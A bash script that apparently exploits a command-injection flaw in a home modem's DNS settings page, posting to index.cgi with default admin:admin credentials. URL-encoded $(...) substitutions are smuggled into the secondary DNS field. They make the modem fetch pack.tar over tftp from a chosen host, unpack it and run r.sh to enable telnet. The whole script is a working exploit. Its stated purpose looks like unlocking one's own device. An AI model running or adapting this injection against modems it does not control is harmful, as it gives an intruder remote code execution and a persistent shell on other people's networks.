#!/bin/bash
# What host is running a tftp server?
TFTP_SERVER=192.168.2.2
# What is the modem's address
MODEM_ADDRESS=192.168.2.1
# What is your modem's serial number?
SERIAL=NQ1212301230123
# which DNS servers do you want to use
DNS1=8.8.4.4
DNS2=8.8.8.8
# Do you want to enable telnet (1 = yes, 0 = no)?
ENABLE=1
# Login info
LOGIN=admin:admin

# Allow remote machines to access... Uncomment this if you need it.
# iptables -I INPUT 1 -p udp --dport 69 -j ACCEPT

# Test retrieve the file
#tftp $TFTP_SERVER -c get pack.tar /tmp/$$.tar
#if [ ! -r /tmp/$$.tar ]
#then
#echo "Failed to retrieve file via tftp" 1>&2
#exit 1
#fi
#rm -f /tmp/$$.tar

# setup
strPost="page=dns&action=submit&update=1&serial_num=$SERIAL&modedns=1&domainname=home&primarydns=$DNS1&secondarydns=$DNS2"
strStep1="%22%20%24(tftp%20-g%20-r%20pack.tar%20-l%20%2Fmnt%2Fjffs2%2Fp.tar%20$TFTP_SERVER)%22"
strStep2="%22%20%24(mkdir%20%2Ftmp%2Funlock)%20%24(tar%20-xf%20%2Fmnt%2Fjffs2%2Fp.tar%20-C%20%2Ftmp%2Funlock)%20%24(%2Ftmp%2Funlock%2Fr.sh%20$ENABLE)%22"

h=http
url="$h://$MODEM_ADDRESS"
#Do the requests
echo "Sending tftp request..."
curl -u "$LOGIN" -d "$strPost$strStep1" "$url/index.cgi" > /tmp/step1
echo "Unpacking and installing..."
curl -u "$LOGIN" -d "$strPost$strStep2" "$url/index.cgi" > /tmp/step2

echo "Process complete."
echo "Try opening $url/stats/ to see if it worked."


